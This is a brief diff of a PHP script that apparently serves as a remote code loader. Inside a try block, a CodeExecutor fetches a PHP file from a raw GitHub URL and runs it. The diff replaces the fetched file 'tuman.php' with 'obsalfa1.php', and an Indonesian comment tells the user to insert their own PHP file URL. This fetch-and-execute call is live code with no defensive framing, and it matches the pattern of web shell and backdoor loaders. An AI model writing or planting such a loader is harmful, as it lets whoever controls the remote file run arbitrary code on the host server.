@@ -86,7 +86,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Ganti URL ini dengan file PHP kamu yang valid
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/tuman.php");
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/tuman88936/tumankan/refs/heads/main/obsalfa1.php");
 } catch (Exception $e) {
     echo "Error: " . htmlspecialchars($e->getMessage());
 }
